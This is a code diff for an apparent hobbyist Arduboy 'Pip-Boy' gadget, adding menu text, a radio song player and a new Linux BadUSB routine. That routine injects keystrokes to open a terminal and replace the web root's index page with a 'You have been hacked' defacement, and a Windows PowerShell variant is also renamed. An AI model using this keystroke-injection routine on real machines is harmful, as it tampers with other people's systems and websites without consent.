@@ -2,6 +2,10 @@
 
 #include "arrays.h"
 
+void plotData() {
+  
+}
+
 void animate() {
   if (pipboy.everyXFrames(9)) {
     if (currentframe < framecount) {
@@ -17,7 +21,11 @@ void startup() {
   //start animation, vault boy probably.
   Sprites::drawOverwrite(WIDTH / 2 - vaultboyWidth / 2, 0, vaultboy, currentframe);
   animate();
-  if (startcounter == framecount * 4) {
+  pipboy.setCursor(0,28);
+  pipboy.print(F("PIP-BOY"));
+  pipboy.setCursor(85, 28);
+  pipboy.print(F("32,000"));
+  if (startcounter == framecount * 3) {
     gamestate = 1;
   }
 }
@@ -221,7 +229,35 @@ void gamecontroller() {
     dirty = false;
 }
 }
-void USBattack() {
+
+void USBattackL(){
+  delay(5000);
+  CommandAtRunBarGnome("gnome-terminal");
+  delay(3000);
+  Keyboard.println("cd /var/www");
+  delay(2000);
+  Keyboard.println("mv index.* index.bak");
+  delay(2000);
+  Keyboard.println("touch index.html");
+  delay(2000);
+  Keyboard.println("nano index.html");
+  delay(2000);
+  Keyboard.println("<marquee><h1>You have been hacked by the BadUSB Leonardo</h1></marquee>");
+  delay(2000);
+  Keyboard.println("<center><a href=\"http://www.usbrubberducky.com/\"><img src=\"http://cdn.shopify.com/s/files/1/0068/2142/products/usbducky2.jpg\" /></a><center>");
+  delay(2000);
+  Keyboard.println("<center><h5>Your old index page can be found <a href=\"./index.bak\">here.</a></h5></center>");
+  delay(2000);
+  Keyboard.press(KEY_LEFT_CTRL);
+  Keyboard.press('x');
+  delay(100);
+  Keyboard.releaseAll();
+  delay(2000);
+  Keyboard.println("y");
+  delay(3000);
+  Keyboard.println("exit");
+}
+void USBattackW() {
   delay(5000);
   CommandAtRunBarMSWIN("powershell");
   delay(4000);
@@ -236,7 +272,7 @@ void USBattack() {
 void subMenus() {
   if (mainMenu == INV) {
     tinyfont.setCursor(6, 0);
-    tinyfont.print(F("\n \n Lock \n \n Key \n \n EMG Cache"));
+    tinyfont.print(F("\n \n Lock \n \n Key \n \n Emergency\n Cache"));
     pipboy.drawLine(62, 0, 62, 52);
     INVcursorx = 0;
     tinyfont.setCursor(64, 5);
@@ -248,7 +284,7 @@ void subMenus() {
 
       case 1: //Key
         INVcursory = 20;
-        tinyfont.print(F("Under\nfloorboards:\n\n\n(37.2431N,\n115.7930W)"));
+        tinyfont.print(F("Under\nfloorboards:\n\n\n(37.2431N\n115.7930W)"));
         break;
 
       case 2://Emergency Cache
@@ -266,7 +302,7 @@ void subMenus() {
   }
   if (mainMenu == USB) {
       pipboy.setCursor(0, 15);
-      pipboy.print(F("   BadUSB Attack \n   Game Controller \n   Serial Terminal"));
+      pipboy.print(F("   BadUSB Attack(W) \n   Game Controller \n   BadUSB Attack(L)"));
       switch (USBselect) {
 
         case 0:
@@ -285,11 +321,34 @@ void subMenus() {
     if (pipboy.justPressed(DOWN_BUTTON) && USBselect < 2) USBselect += 1;
     if (pipboy.justPressed(UP_BUTTON) && USBselect > 0) USBselect -= 1;
     if (pipboy.justPressed(A_BUTTON) && USBselect == 0) {
-      USBattack();
+      USBattackW();
     }
     if (pipboy.justPressed(A_BUTTON) && USBselect == 1) {  //hold all four directions to exit
       gamestate = 2;
     }
+    if (pipboy.justPressed(A_BUTTON) && USBselect == 2) {
+      USBattackL();
+    }
+  }
+  if (mainMenu == RAD){
+    tinyfont.setCursor(6,0);
+    tinyfont.print(F(" Into Each Life \n \n Crawl Out Through \n The Fallout"));
+    switch (RADselect){
+      case 0:
+      pipboy.setCursor(0,0);
+      break;
+
+      case 1:
+      pipboy.setCursor(0,10);
+      break;
+    }
+    pipboy.print(F(">"));
+    Sprites::drawSelfMasked(94, 10, radiograph, 0);
+    if (pipboy.justPressed(DOWN_BUTTON) && RADselect < 1) RADselect += 1;
+    if (pipboy.justPressed(UP_BUTTON) && RADselect > 0) RADselect -= 1;
+    if (pipboy.justPressed(A_BUTTON) && RADselect == 0) radio.tones(intoeachlife);
+    if (pipboy.justPressed(A_BUTTON) && RADselect == 1) radio.tones(crawlout);
+    plotData();
   }
 
 }
@@ -305,8 +364,10 @@ void UI() {
   pipboy.drawLine(34, 52, 34, 64);//INV | USB
   pipboy.drawLine(64, 52, 64, 64);// USB | MAP
   pipboy.drawLine(94, 52, 94, 64);// MAP | RAD
-
-
+  if (pipboy.pressed(B_BUTTON)){
+    startcounter = 0;
+    gamestate = 0;
+  }
   //update menu
   handleMainMenu();
   //update specific menu parts if they are selected
